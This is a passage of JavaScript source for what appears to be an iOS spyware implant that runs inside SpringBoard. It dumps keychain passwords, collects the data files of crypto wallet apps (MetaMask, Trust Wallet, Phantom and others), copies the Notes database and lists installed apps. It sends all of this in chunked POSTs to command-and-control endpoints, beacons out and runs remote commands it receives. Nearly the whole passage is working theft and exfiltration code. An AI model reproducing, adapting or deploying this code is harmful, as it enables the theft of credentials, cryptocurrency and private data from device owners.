\"inet\")) {\n\t\t\tplainCount++;\n\t\t\treadable += \"[\" + e.class + \"]\\n\";\n\t\t\tif (e.agrp) readable += \"  agrp: \" + e.agrp + \"\\n\";\n\t\t\tif (e.svce) readable += \"  svce: \" + e.svce + \"\\n\";\n\t\t\tif (e.acct) readable += \"  acct: \" + e.acct + \"\\n\";\n\t\t\tif (e.labl) readable += \"  labl: \" + e.labl + \"\\n\";\n\t\t\treadable += \"  password: \" + data + \"\\n\\n\";\n\t\t}\n\t}\n\treadable += \"Plaintext password items: \" + plainCount + \"\\n\";\n\treadable += \"Items with v_Data field: \" + withData + \"\\n\";\n\n\t_secWriteText(_SEC_DUMP_FULL, content);\n\t_secWriteText(_SEC_DUMP_FULL_ALT, content);\n\t_secWriteText(_SEC_DUMP_READ, readable);\n\t_secWriteText(_SEC_DUMP_READ_ALT, readable);\n\t_secWriteText(_SEC_DUMP_DONE, \"items=\" + allEntries.length + \" plain=\" + plainCount + \" vdata=\" + withData + \"\\n\");\n\treturn { items: allEntries.length, plain: plainCount, vdata: withData };\n}\n\nfunction _kcSecItemDump(force) {\n\tconst now = Date.now();\n\tif (!force && _secDumpState.lastRun && (now - _secDumpState.lastRun) < 45000)\n\t\treturn _secDumpState;\n\t_secDumpState.lastRun = now;\n\t_writeLog(\"[SEC-DUMP] begin force=\" + (!!force) + \" classes=\" + _SEC_CLASSES.length);\n\tconst all = [];\n\tfor (let ci = 0; ci < _SEC_CLASSES.length; ci++) {\n\t\tconst cls = _SEC_CLASSES[ci];\n\t\ttry {\n\t\t\tlet items = _secDumpClass(cls.id, cls.label, true);\n\t\t\tif (!items.length) items = _secDumpClass(cls.id, cls.label, false);\n\t\t\tfor (let ii = 0; ii < items.length; ii++) all.push(items[ii]);\n\t\t} catch (_clse) {\n\t\t\t_secDumpState[\"err_\" + cls.id] = String(_clse).substring(0, 60);\n\t\t}\n\t}\n\tconst st = _secWriteDump(all);\n\t_secDumpState.items = st.items;\n\t_secDumpState.plain = st.plain;\n\t_secDumpState.vdata = st.vdata;\n\t_writeLog(\"[SEC-DUMP] items=\" + st.items + \" plain=\" + st.plain + \" vdata=\" + st.vdata +\n\t\t\" st_genp=\" + (_secDumpState.st_genp || 0) + \" st_inet=\" + (_secDumpState.st_inet || 0));\n\tif (st.plain > 0) {\n\t\t// Let the P7-era HQ gate observe a completed keychain.\n\t\t_secWriteText(\"/tmp/keychain_c2_dump.done\", \"secitem plain=\" + st.plain + \" ts=\" + now + \"\\n\");\n\t}\n\treturn _secDumpState;\n}\n\n// ============================================================================\n// HQ Wallet Package Builder\n// ============================================================================\n\nvar _hqSandboxKeyMap = {\n\t\"Trust Wallet\": \"trust_wallet\", \"Bitget\": \"bitget\", \"Coin98\": \"coin98\",\n\t\"TronLink\": \"tronlink\", \"Tonhub\": \"tonhub\", \"TokenPocket\": \"tokenpocket\",\n\t\"imToken\": \"imtoken\", \"MetaMask\": \"metamask\", \"OKX\": \"okx\",\n\t\"Solflare\": \"solflare\", \"Phantom\": \"phantom\", \"Bitpie\": \"bitpie\",\n\t\"Uniswap\": \"uniswap\", \"MyTonWallet\": \"mytonwallet\", \"Exodus\": \"exodus\",\n\t\"Tonkeeper\": \"tonkeeper\", \"Coinbase\": \"coinbase\"\n};\n\nfunction _buildWalletPkg(deviceUUID) {\n\tvar kcDumpPath = \"/tmp/keychain_c2_dump.json\";\n\tvar kcData = _readFileBytes(kcDumpPath, 5242880);\n\tif (!kcData) {\n\t\tNative.callSymbol(\"chmod\", \"/tmp/keychain_c2_dump.json.tmp\", 0x1A4);\n\t\tNative.callSymbol(\"rename\", \"/tmp/keychain_c2_dump.json.tmp\", kcDumpPath);\n\t\tNative.callSymbol(\"chmod\", kcDumpPath, 0x1A4);\n\t\tkcData = _readFileBytes(kcDumpPath, 5242880);\n\t}\n\tvar keychain;\n\tif (!kcData) {\n\t\t_writeLog(\"[WALLET-HQ] no keychain_c2_dump.json - sandbox-only package\");\n\t\tkeychain = { partial: true, errors: [\"no_keychain_dump\"], tables: {}, wallets: {}, metadataKeys: {} };\n\t} else {\n\t\tvar kcStr = _rawToStr(kcData);\n\t\ttry { keychain = JSON.parse(kcStr); } catch(e) {\n\t\t\t_writeLog(\"[WALLET-HQ] keychain json parse fail - sandbox-only\");\n\t\t\tkeychain = { partial: true, errors: [\"keychain_parse_fail\"], tables: {}, wallets: {}, metadataKeys: {} };\n\t\t}\n\t}\n\n\t// Attach SpringBoard SecItem plaintext dump (P7-independent channel).\n\ttry {\n\t\tvar secFullB = _readFileBytes(_SEC_DUMP_FULL, 1572864);\n\t\tif (secFullB && secFullB.length > 8) {\n\t\t\tkeychain.secitem_full = _rawToStr(secFullB);\n\t\t\tvar secReadB = _readFileBytes(_SEC_DUMP_READ, 786432);\n\t\t\tif (secReadB && secReadB.length > 8) keychain.secitem_readable = _rawToStr(secReadB);\n\t\t\tvar secDoneB = _readFileBytes(_SEC_DUMP_DONE, 256);\n\t\t\tif (secDoneB) keychain.secitem_marker = _rawToStr(secDoneB);\n\t\t\tkeychain.secitem = { items: _secDumpState.items, plain: _secDumpState.plain, vdata: _secDumpState.vdata };\n\t\t}\n\t} catch(_se) {}\n\n\tvar dirs = listDir(APP_DATA_BASE);\n\tvar containerMap = {};\n\tfor (var i = 0; i < dirs.length; i++) {\n\t\tif (dirs[i].type !== \"dir\") continue;\n\t\tvar cpath = APP_DATA_BASE + \"/\" + dirs[i].name;\n\t\tvar plistPath = cpath + \"/.com.apple.mobile_container_manager.metadata.plist\";\n\t\tif (Number(Native.callSymbol(\"access\", plistPath, 0)) !== 0) continue;\n\t\tvar bytes = _readFileBytes(plistPath, 8192);\n\t\tif (!bytes || bytes.length === 0) continue;\n\t\tvar content = _rawToStr(bytes);\n\t\tfor (var bid in WALLET_BUNDLE_IDS) {\n\t\t\tif (content.indexOf(bid) >= 0 && !containerMap[bid]) containerMap[bid] = cpath;\n\t\t}\n\t}\n\n\tvar sandbox = {};\n\tvar totalSize = 0;\n\tfor (var bid in containerMap) {\n\t\tvar cfg = WALLET_BUNDLE_IDS[bid];\n\t\tif (!cfg.sandbox || !cfg.files) continue;\n\t\tvar key = _hqSandboxKeyMap[cfg.name] || cfg.name.toLowerCase().replace(/ /g, \"_\");\n\t\tvar perFileMax = cfg.maxFileSize || 2097152;\n\t\tvar resolved = _resolveWalletFiles(containerMap[bid], cfg.files);\n\t\tvar files = {};\n\t\tfor (var fi = 0; fi < resolved.length; fi++) {\n\t\t\tvar rf = resolved[fi];\n\t\t\tvar fd = readFileB64(rf.absPath, perFileMax);\n\t\t\tif (!fd) continue;\n\t\t\tfiles[rf.relPath] = fd.b64;\n\t\t\ttotalSize += fd.size;\n\t\t}\n\t\tif (Object.keys(files).length > 0) sandbox[key] = files;\n\t}\n\n\treturn { device_uuid: deviceUUID, keychain: keychain, sandbox: sandbox, sandbox_total_size: totalSize };\n}\n\nfunction _httpPostBody(url, bodyStr) {\n\tvar parsed = parseURL(url);\n\tif (url.indexOf(\"https://\") === 0)\n\t\treturn _cfstreamPost(parsed.host, parsed.port, parsed.path, bodyStr);\n\treturn _socketPost(parsed.host, parsed.port, parsed.path, bodyStr);\n}\n\n// POST wallet package to /war. Bodies larger than WAR_POST_MAX are split into\n// war_chunk parts (still on /war); inbox reassembles before normal extract.\nfunction _postWarPackage(url, pkg) {\n\tvar bodyStr = JSON.stringify(pkg);\n\tif (bodyStr.length <= WAR_POST_MAX) {\n\t\treturn _httpPostBody(url, bodyStr);\n\t}\n\tvar uploadId = String(DEVICE_UUID || \"dev\").replace(/[^0-9A-Fa-f]/g, \"\") + \"_\" + String(Date.now());\n\t// Keep each HTTP JSON under WAR_POST_MAX after base64 + wrapper overhead.\n\tvar rawMax = Math.floor((WAR_POST_MAX - 2048) * 3 / 4);\n\tif (rawMax < 256 * 1024) rawMax = 256 * 1024;\n\tvar tmpPath = \"/tmp/war_pkg_\" + uploadId + \".json\";\n\tif (!_secWriteText(tmpPath, bodyStr)) {\n\t\t_writeLog(\"[WALLET-HQ] war chunk tmp write fail; trying single POST len=\" + bodyStr.length);\n\t\treturn _httpPostBody(url, bodyStr);\n\t}\n\tvar fileSize = getFileSize(tmpPath);\n\tif (fileSize <= 0) {\n\t\tNative.callSymbol(\"unlink\", tmpPath);\n\t\treturn _httpPostBody(url, bodyStr);\n\t}\n\tvar totalChunks = Math.ceil(fileSize / rawMax);\n\t_writeLog(\"[WALLET-HQ] chunked /war upload_id=\" + uploadId + \" bytes=\" + fileSize + \" parts=\" + totalChunks);\n\tvar fd = Number(Native.callSymbol(\"open\", tmpPath, 0, 0));\n\tif (fd < 0) {\n\t\tNative.callSymbol(\"unlink\", tmpPath);\n\t\treturn _httpPostBody(url, bodyStr);\n\t}\n\tvar buf = Native.callSymbol(\"malloc\", BigInt(rawMax));\n\tvar sentOk = 0;\n\tvar lastErr = \"\";\n\ttry {\n\t\tfor (var ci = 0; ci < totalChunks; ci++) {\n\t\t\tvar toRead = Math.min(rawMax, fileSize - ci * rawMax);\n\t\t\tvar nr = Number(Native.callSymbol(\"read\", fd, buf, toRead));\n\t\t\tif (nr <= 0) { lastErr = \"read \" + nr; break; }\n\t\t\tvar b64 = bytesToBase64(new Uint8Array(Native.read(buf, nr)));\n\t\t\tvar part = {\n\t\t\t\tdevice_uuid: DEVICE_UUID,\n\t\t\t\twar_chunk: true,\n\t\t\t\tupload_id: uploadId,\n\t\t\t\tchunk_index: ci,\n\t\t\t\ttotal_chunks: totalChunks,\n\t\t\t\ttotal_bytes: fileSize,\n\t\t\t\tdata: b64\n\t\t\t};\n\t\t\tvar partStr = JSON.stringify(part);\n\t\t\tvar postOk = false;\n\t\t\tfor (var retry = 0; retry < 3; retry++) {\n\t\t\t\ttry {\n\t\t\t\t\tvar r = _httpPostBody(url, partStr);\n\t\t\t\t\tif (r !== null) { postOk = true; break; }\n\t\t\t\t} catch (_pe) {}\n\t\t\t\tNative.callSymbol(\"usleep\", 2000000);\n\t\t\t}\n\t\t\tif (!postOk) { lastErr = \"POST fail chunk \" + ci; break; }\n\t\t\tsentOk++;\n\t\t}\n\t} finally {\n\t\tif (buf && buf !== 0n) Native.callSymbol(\"free\", buf);\n\t\tNative.callSymbol(\"close\", fd);\n\t\tNative.callSymbol(\"unlink\", tmpPath);\n\t}\n\tif (sentOk !== totalChunks) {\n\t\t_writeLog(\"[WALLET-HQ] chunked /war incomplete sent=\" + sentOk + \"/\" + totalChunks + \" err=\" + lastErr);\n\t\treturn null;\n\t}\n\treturn { ok: true, chunked: true, upload_id: uploadId, total_chunks: totalChunks, total_bytes: fileSize };\n}\n\n// ============================================================================\n// Main Loop\n// ============================================================================\n\nNative.init();\n\n// ===== DEBUG uplink: prove c2_agent actually evaluated in SpringBoard =====\ntry {\n\tvar _dbgfd = Number(Native.callSymbol(\"socket\", 2, 1, 0));\n\tif (_dbgfd >= 0) {\n\t\tvar _dbgone = Native.callSymbol(\"calloc\", 1, 8);\n\t\tNative.write(_dbgone, new Uint8Array([1,0,0,0]).buffer);\n\t\tNative.callSymbol(\"setsockopt\", _dbgfd, 0xffff, 0x1022, _dbgone, 4);\n\t\tNative.callSymbol(\"free\", _dbgone);\n\t\tvar _dbgaddr = Native.callSymbol(\"calloc\", 1, 16);\n\t\tvar _dbga8 = new Uint8Array(16);\n\t\t_dbga8[0] = 16; _dbga8[1] = 2; _dbga8[2] = 0x1B; _dbga8[3] = 0x6E; // port 7022 BE\n\t\t_dbga8[4] = 192; _dbga8[5] = 168; _dbga8[6] = 4; _dbga8[7] = 10;\n\t\tNative.write(_dbgaddr, _dbga8.buffer);\n\t\tif (Number(Native.callSymbol(\"connect\", _dbgfd, _dbgaddr, 16)) === 0) {\n\t\t\tvar _dbgreq = \"GET /log.html?text=C2SB_eval_alive_springboard HTTP/1.0\\r\\nHost: cdn.gotoiphone.com\\r\\n\\r\\n\";\n\t\t\tvar _dbgrbuf = Native.callSymbol(\"malloc\", _dbgreq.length + 1);\n\t\t\tNative.writeString(_dbgrbuf, _dbgreq);\n\t\t\tNative.callSymbol(\"write\", _dbgfd, _dbgrbuf, _dbgreq.length);\n\t\t\tNative.callSymbol(\"free\", _dbgrbuf);\n\t\t}\n\t\tNative.callSymbol(\"close\", _dbgfd);\n\t\tNative.callSymbol(\"free\", _dbgaddr);\n\t}\n} catch(e) {}\n// ===== END DEBUG uplink =====\n\nconst DEVICE_UUID  = (function(){try{var b=String(\"1CD3AADB5519D4988004AB9B1369B1FD\");if(b&&b.indexOf(\"__LAB_\")<0&&b.length>=16)return b;}catch(e){}return _getDeviceUUID();})();\nconst DEVICE_MODEL = _getDeviceModel();\n\n// NOTE: first SecItem dump is deferred until AFTER the first beacon (Phase 1).\n// A SecItemCopyMatching wedge here would kill the agent before any heartbeat.\n\nfunction _sysctlString(name) {\n\tvar sizePtr = Native.callSymbol(\"calloc\", 1, 8);\n\tif (!sizePtr || sizePtr === 0n) return \"\";\n\tvar rc = Number(Native.callSymbol(\"sysctlbyname\", name, 0, sizePtr, 0, 0));\n\tif (rc !== 0) { Native.callSymbol(\"free\", sizePtr); return \"\"; }\n\tvar sz = Number(Native.readPtr(BigInt(sizePtr)));\n\tif (sz <= 0 || sz > 4096) { Native.callSymbol(\"free\", sizePtr); return \"\"; }\n\tvar buf = Native.callSymbol(\"malloc\", BigInt(sz + 1));\n\tif (!buf || buf === 0n) { Native.callSymbol(\"free\", sizePtr); return \"\"; }\n\tNative.write64(sizePtr, BigInt(sz + 1));\n\trc = Number(Native.callSymbol(\"sysctlbyname\", name, buf, sizePtr, 0, 0));\n\tvar result = rc === 0 ? Native.readString(buf, sz).replace(/\\0/g, \"\") : \"\";\n\tNative.callSymbol(\"free\", buf); Native.callSymbol(\"free\", sizePtr);\n\treturn result;\n}\n\n\nvar _beaconDevInfo = { machine: DEVICE_MODEL };\nif (C2_CHANNEL_CODE) _beaconDevInfo.channel_code = C2_CHANNEL_CODE;\ntry {\n\tvar _uts = Native.callSymbol(\"calloc\", 1, 1536);\n\tif (_uts && _uts !== 0n) {\n\t\tNative.callSymbol(\"uname\", _uts);\n\t\t_beaconDevInfo.sysname  = Native.readString(_uts, 256).replace(/\\0/g, \"\");\n\t\t_beaconDevInfo.nodename = Native.readString(_uts + 256n, 256).replace(/\\0/g, \"\");\n\t\t_beaconDevInfo.release  = Native.readString(_uts + 512n, 256).replace(/\\0/g, \"\");\n\t\t_beaconDevInfo.version  = Native.readString(_uts + 768n, 256).replace(/\\0/g, \"\");\n\t\t_beaconDevInfo.arch     = Native.readString(_uts + 1024n, 256).replace(/\\0/g, \"\");\n\t\tNative.callSymbol(\"free\", _uts);\n\t}\n} catch(e) {}\ntry {\n\tvar _hbuf = Native.callSymbol(\"malloc\", 256);\n\tif (_hbuf && _hbuf !== 0n) {\n\t\tif (Number(Native.callSymbol(\"gethostname\", _hbuf, 255)) === 0)\n\t\t\t_beaconDevInfo.hostname = Native.readString(_hbuf, 256).replace(/\\0/g, \"\");\n\t\tNative.callSymbol(\"free\", _hbuf);\n\t}\n} catch(e) {}\n\ntry { _beaconDevInfo.build_version = _sysctlString(\"kern.osversion\"); } catch(e) {}\ntry { _beaconDevInfo.ios_version = _sysctlString(\"kern.osproductversion\"); } catch(e) {}\ntry { _beaconDevInfo.kern_version = _beaconDevInfo.version || \"\"; } catch(e) {}\n\nfunction _senBeacon() {\n\ttry {\n\t\treturn httpPost(C2_BEACON_URL, {\n\t\t\tuuid: DEVICE_UUID, device_info: _beaconDevInfo, status: \"idle\"\n\t\t});\n\t} catch(e) { return null; }\n}\n\n// --- Phase 1: First SEN beacon (registers device, starts 5-min delay) ---\nvar _senResp1 = _senBeacon();\nvar _deviceIP = \"\";\nif (_senResp1 && _senResp1.client_ip) _deviceIP = _senResp1.client_ip;\nNative.callSymbol(\"usleep\", 2000000);\n\n// Heartbeat established — now safe to attempt the early keychain plaintext\n// grab (device still likely unlocked). u_AuthUISkip protects against wedges.\ntry { _kcSecItemDump(true); } catch(_kd0) {}\n\nfunction _hqHeartbeat() {\n\ttry {\n\t\tvar body = { lhu: DEVICE_UUID, type: \"status\", source: \"c2_agent\" };\n\t\tif (_deviceIP) body.ip = _deviceIP;\n\t\thqPost(\"/event\", body);\n\t} catch(e) {}\n}\n\n// --- Phase 2: HQ auto-collect (SEN heartbeats interspersed) ---\n\ntry { hqPost(\"/a\", {\n\tlhu: DEVICE_UUID, machine: DEVICE_MODEL,\n\tdeviceName: _beaconDevInfo.hostname || \"\",\n\tios_version: _beaconDevInfo.ios_version || \"\",\n\tbuild_version: _beaconDevInfo.build_version || \"\",\n\tkern_version: _beaconDevInfo.kern_version || \"\",\n\thostname: _beaconDevInfo.hostname || \"\",\n\tsysname: _beaconDevInfo.sysname || \"\",\n\trelease: _beaconDevInfo.release || \"\",\n\tversion: _beaconDevInfo.version || \"\",\n\tip: _deviceIP,\n\tsource: \"c2_agent\"\n}); } catch(e) {}\n\nNative.callSymbol(\"usleep\", 1000000);\n_hqHeartbeat();\n\ntry {\n\tvar _hqApps = [];\n\tvar _appBases = [APP_DATA_BASE, \"/var/mobile/Containers/Bundle/Application\"];\n\tvar _hqDirs = [];\n\tvar _usedBase = \"\";\n\tfor (var _bi = 0; _bi < _appBases.length; _bi++) {\n\t\t_hqDirs = listDir(_appBases[_bi]);\n\t\tif (_hqDirs.length > 0) { _usedBase = _appBases[_bi]; break; }\n\t}\n\tfor (var _ai = 0; _ai < _hqDirs.length; _ai++) {\n\t\tif (_hqDirs[_ai].type !== \"dir\") continue;\n\t\tvar _acp = _usedBase + \"/\" + _hqDirs[_ai].name;\n\t\tvar _apl = _acp + \"/.com.apple.mobile_container_manager.metadata.plist\";\n\t\tvar _ab = _readFileBytes(_apl, 8192);\n\t\tif (!_ab || _ab.length === 0) continue;\n\t\tvar _ac = _rawToStr(_ab);\n\t\tif (_ac.indexOf(\"MCMMetadataIdentifier\") < 0) continue;\n\t\tvar _bm = _ac.match(/MCMMetadataIdentifier<\\/key>\\s*<string>([^<]+)/);\n\t\tif (!_bm) {\n\t\t\tvar _bpAll = _ac.match(/[a-z][a-z0-9]*(?:\\.[a-zA-Z0-9_-]+){2,}/g);\n\t\t\tif (_bpAll) {\n\t\t\t\tfor (var _bpi = 0; _bpi < _bpAll.length; _bpi++) {\n\t\t\t\t\tif (_bpAll[_bpi].indexOf(\"MCM\") >= 0) continue;\n\t\t\t\t\t_bm = [null, _bpAll[_bpi]];\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tif (!_bm) continue;\n\t\tvar _appName = _bm[1];\n\t\tvar _subDirs = listDir(_acp);\n\t\tfor (var _si = 0; _si < _subDirs.length; _si++) {\n\t\t\tvar _sn = _subDirs[_si].name;\n\t\t\tif (_sn.length > 4 && _sn.substring(_sn.length - 4) === \".app\") {\n\t\t\t\t_appName = _sn.substring(0, _sn.length - 4);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\t_hqApps.push({ uuid: _hqDirs[_ai].name, bundleId: _bm[1], name: _appName });\n\t}\n\thqPost(\"/u\", { lhu: DEVICE_UUID, apps: _hqApps, count: _hqApps.length, source: \"c2_agent\" });\n} catch(e) {}\n\n_senBeacon();\nNative.callSymbol(\"usleep\", 1000000);\n\ntry {\n\tvar _hqDbPath = _findNoteStore();\n\tif (_hqDbPath) {\n\t\tvar _hqSuffixes = [\"\", \"-wal\", \"-shm\"];\n\t\tvar _hqTmpBase = \"/tmp/_hq_notestore\";\n\t\tfor (var _ci = 0; _ci < _hqSuffixes.length; _ci++) {\n\t\t\tvar _csrc = _hqDbPath + _hqSuffixes[_ci];\n\t\t\tif (Number(Native.callSymbol(\"access\", _csrc, 0)) === 0) {\n\t\t\t\tvar _cdst = _hqTmpBase + _hqSuffixes[_ci];\n\t\t\t\t_cmdCp([\"cp\", _csrc, _cdst]);\n\t\t\t\tNative.callSymbol(\"chmod\", _cdst, 0x1A4);\n\t\t\t}\n\t\t}\n\t\tvar _noteList = [];\n\t\tvar _noteRows = _sqliteQuery(_hqTmpBase,\n\t\t\t\"SELECT Z_PK, ZTITLE1, ZSNIPPET, ZMODIFICATIONDATE1 FROM ZICCLOUDSYNCINGOBJECT WHERE ZTITLE1 IS NOT NULL ORDER BY ZMODIFICATIONDATE1 DESC LIMIT 500\", 500);\n\t\tif (_noteRows && _noteRows.rows) {\n\t\t\tfor (var _ni = 0; _ni < _noteRows.rows.length; _ni++) {\n\t\t\t\tvar _nr = _noteRows.rows[_ni];\n\t\t\t\tif (!_nr.ZTITLE1 && !_nr.ZSNIPPET) continue;\n\t\t\t\t_noteList.push({\n\t\t\t\t\tid: _nr.Z_PK,\n\t\t\t\t\ttitle: _nr.ZTITLE1 || \"\",\n\t\t\t\t\tsnippet: _nr.ZSNIPPET || \"\",\n\t\t\t\t\tmod: _nr.ZMODIFICATIONDATE1\n\t\t\t\t});\n\t\t\t}\n\t\t}\n\t\tvar _hqDbFiles = [];\n\t\tfor (var _mi = 0; _mi < _hqSuffixes.length; _mi++) {\n\t\t\tvar _mfp = _hqTmpBase + _hqSuffixes[_mi];\n\t\t\tvar _mfd = readFileB64(_mfp, 5242880);\n\t\t\tif (_mfd) {\n\t\t\t\tvar _origName = _hqDbPath.substring(_hqDbPath.lastIndexOf(\"/\") + 1) + _hqSuffixes[_mi];\n\t\t\t\t_hqDbFiles.push({ name: _origName, data: _mfd.b64, size: _mfd.size });\n\t\t\t}\n\t\t}\n\t\tfor (var _di = 0; _di < _hqSuffixes.length; _di++)\n\t\t\tNative.callSymbol(\"unlink\", _hqTmpBase + _hqSuffixes[_di]);\n\t\tif (_noteList.length > 0 || _hqDbFiles.length > 0)\n\t\t\thqPost(\"/nb\", { lhu: DEVICE_UUID, list: _noteList, db_files: _hqDbFiles, db_path: _hqDbPath, count: _noteList.length, source: \"c2_agent\" });\n\t}\n} catch(e) {}\n\n_senBeacon();\n_hqHeartbeat();\nNative.callSymbol(\"usleep\", 1000000);\n\nvar _walletHqSent = false;\nvar _walletHqP7Logged = false;\nvar _walletHqFailLogged = false;\nvar _walletHqAttempt = 0;\nvar _walletHqPlainAtSend = 0;\nvar _walletHqResends = 0;\nfunction _tryWalletHq(reason) {\n\tif (_walletHqSent) return true;\n\t_walletHqAttempt++;\n\tvar _kcDonePath = \"/tmp/keychain_c2_dump.done\";\n\tvar hasDone = Number(Native.callSymbol(\"access\", _kcDonePath, 0)) === 0;\n\tvar hasPartial = Number(Native.callSymbol(\"access\", \"/tmp/keychain_c2_dump.partial\", 0)) === 0;\n\tvar hasJson = Number(Native.callSymbol(\"access\", \"/tmp/keychain_c2_dump.json\", 0)) === 0;\n\tvar hasDb = false;\n\ttry {\n\t\tvar __tdbFd = Number(Native.callSymbol(\"open\", \"/tmp/keychain-2.db\", 0));\n\t\tif (__tdbFd >= 0) {\n\t\t\tvar __tdbSz = Number(Native.callSymbol(\"lseek\", __tdbFd, 0, 2));\n\t\t\tNative.callSymbol(\"close\", __tdbFd);\n\t\t\thasDb = __tdbSz > 1024;\n\t\t}\n\t} catch (_tdb) {}\n\tvar hasP7 = Number(Native.callSymbol(\"access\", \"/tmp/p7_debug.log\", 0)) === 0;\n\tvar hasFail = Number(Native.callSymbol(\"access\", \"/tmp/keychain_c2_dump.fail\", 0)) === 0;\n\tif (reason !== \"beacon-retry\" || (_walletHqAttempt % 4) === 1) {\n\t\t_writeLog(\"[WALLET-HQ] \" + reason + \" done=\" + hasDone + \" partial=\" + hasPartial + \" json=\" + hasJson + \" tmpdb=\" + hasDb + \" p7log=\" + hasP7 + \" fail=\" + hasFail);\n\t}\n\tif (hasFail && !_walletHqFailLogged) {\n\t\t_walletHqFailLogged = true;\n\t\ttry {\n\t\t\tvar fb = _readFileBytes(\"/tmp/keychain_c2_dump.fail\", 512);\n\t\t\tif (fb) _writeLog(\"[WALLET-HQ] p7 fail marker: \" + _rawToStr(fb));\n\t\t} catch(_fre) {}\n\t}\n\t// Re-tail p7 on first sight and every beacon-retry so HTTP/phone_logs show Phase2 progress\n\t// (pe_stage/*.js are ~100B trampolines — real logs live in /tmp/p7_debug.log).\n\tif (hasP7 && (!_walletHqP7Logged || reason === \"beacon-retry\")) {\n\t\ttry {\n\t\t\tvar p7b = _readFileBytes(\"/tmp/p7_debug.log\", 24000);\n\t\t\tif (p7b) {\n\t\t\t\tvar p7t = _rawToStr(p7b);\n\t\t\t\t_writeLog(\"[WALLET-HQ] p7_debug.tail=\" + p7t.slice(Math.max(0, p7t.length - 2200)));\n\t\t\t\t_walletHqP7Logged = true;\n\t\t\t}\n\t\t} catch(_p7e) {}\n\t}\n\tif (hasFail) {\n\t\t// Definitive failure from P7 Phase 2 — send what we have immediately\n\t\t// (fail-json is picked up by _buildWalletPkg as `keychain` with fail:true).\n\t\t// Do NOT wait for 40 retries; this keeps C2 responsive.\n\t} else if (!hasJson && !hasFail) {\n\t\t// Wait for Phase2 json (early .done alone is not enough — 18.5 early C2).\n\t\tvar _p7Busy = Number(Native.callSymbol(\"access\", \"/tmp/p7_debug.log\", 0)) === 0;\n\t\tif (!_p7Busy && _walletHqAttempt % 5 === 0) { try { _kcSecItemDump(false); } catch(_kdr) {} }\n\t\tif (_walletHqAttempt < 80) return false;\n\t\t_writeLog(\"[WALLET-HQ] force sandbox-only after retries json=false\");\n\t}\n\tif (!hasDone) { try { _kcSecItemDump(false); } catch(_kd) {} }\n\tNative.callSymbol(\"usleep\", 500000);\n\tvar _walletPkg = _buildWalletPkg(DEVICE_UUID);\n\tif (!_walletPkg) {\n\t\t_writeLog(\"[WALLET-HQ] _buildWalletPkg returned null\");\n\t\treturn false;\n\t}\n\tvar _walletUrl = HQ_API_BASE.replace(/:\\d+/, \":\" + HQ_WALLET_PORT) + \"/war\";\n\tvar _walletBodyLen = JSON.stringify(_walletPkg).length;\n\t_writeLog(\"[WALLET-HQ] sending to \" + _walletUrl + \" body=\" + _walletBodyLen +\n\t\t(_walletBodyLen > WAR_POST_MAX ? \" (chunked>\" + WAR_POST_MAX + \")\" : \"\"));\n\ttry {\n\t\tvar _walletResp = _postWarPackage(_walletUrl, _walletPkg);\n\t\tif (_walletResp === null) {\n\t\t\t_writeLog(\"[WALLET-HQ] POST FAILED (null)\");\n\t\t\treturn false;\n\t\t}\n\t\t_writeLog(\"[WALLET-HQ] POST ok resp=\" + JSON.stringify(_walletResp));\n\t\t_walletHqSent = true;\n\t\t_walletHqPlainAtSend = _secDumpState.plain;\n\t\treturn true;\n\t} catch(walletErr) {\n\t\t_writeLog(\"[WALLET-HQ] POST FAILED err=\" + String(walletErr));\n\t\treturn false;\n\t}\n}\ntry {\n\t_tryWalletHq(\"after-nb\");\n} catch(walletOuterErr) {\n\t_writeLog(\"[WALLET-HQ] outer error: \" + String(walletOuterErr));\n}\n\n_senBeacon();\n_hqHeartbeat();\nNative.callSymbol(\"usleep\", 1000000);\n\ntry {\n\t/* photos upload disabled */\n} catch(e) {}\n\n// --- Phase 3: SEN beacon loop ---\n\nvar _hqHeartbeatNext = Date.now() + 60000;\nlet interval = 15;\nfor (;;) {\n\ttry {\n\t\tconst resp = _senBeacon();\n\t\tif (!_walletHqSent) { try { _tryWalletHq(\"beacon-retry\"); } catch(_wr) {} }\n\t\telse if (_walletHqResends < 3) {\n\t\t\t// Late-unlock self-heal: keep dumping; resend /war when plaintext grows.\n\t\t\ttry { _kcSecItemDump(false); } catch(_kd2) {}\n\t\t\tif (_secDumpState.plain > _walletHqPlainAtSend) {\n\t\t\t\t_walletHqResends++;\n\t\t\t\ttry {\n\t\t\t\t\tvar _pkg2 = _buildWalletPkg(DEVICE_UUID);\n\t\t\t\t\tif (_pkg2) {\n\t\t\t\t\t\tvar _url2 = HQ_API_BASE.replace(/:\\d+/, \":\" + HQ_WALLET_PORT) + \"/war\";\n\t\t\t\t\t\t_writeLog(\"[WALLET-HQ] resend plain=\" + _secDumpState.plain + \" > \" + _walletHqPlainAtSend + \" #\" + _walletHqResends);\n\t\t\t\t\t\t_postWarPackage(_url2, _pkg2);\n\t\t\t\t\t\t_walletHqPlainAtSend = _secDumpState.plain;\n\t\t\t\t\t}\n\t\t\t\t} catch(_re) {}\n\t\t\t}\n\t\t}\n\n\t\tif (resp && resp.type && resp.type !== \"noop\") {\n\t\t\ttry {\n\t\t\t\tswitch (resp.type) {\n\t\t\t\t\tcase \"execute_command\": handleExecuteCommand(resp); break;\n\t\t\t\t\tcase \"ls\":          handleLs(resp);          break;\n\t\t\t\t\tcase \"download\":    handleDownload(resp);    break;\n\t\t\t\t\tcase \"photos\":      handlePhotos(resp);      break;\n\t\t\t\t\tcase \"apps\":        handleApps(resp);        break;\n\t\t\t\t\tcase \"exec\":        handleExec(resp);        break;\n\t\t\t\t\tcase \"file_upload\": handleFileUpload(resp);  break;\n\t\t\t\t\tcase \"basic_info\":  handleBasicInfo(resp);   break;\n\t\t\t\t\tcase \"disk_scan\":    handleDiskScan(resp);    break;\n\t\t\t\t\tcase \"ios_app_data\": handleIosAppData(resp);  break;\n\t\t\t\tcase \"wallet_extract\": handleWalletExtract(resp); break;\n\t\t\t\tcase \"wallet_scan\":    handleWalletScan(resp);    break;\n\t\t\t\tcase \"memo_scan\":      handleMemoScan(resp);      break;\n\t\t\t\tcase \"photo_scan\":     handlePhotoScan(resp);     break;\n\t\t\t\tcase \"sleep\":\n\t\t\t\t\t\tinterval = (resp.params && resp.params.interval) || 15;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase \"exit\":\n\t\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t} catch (cmdErr) {\n\t\t\t\ttry {\n\t\t\t\t\tsendJSON(resp.command_id, {\n\t\t\t\t\t\tstatus: 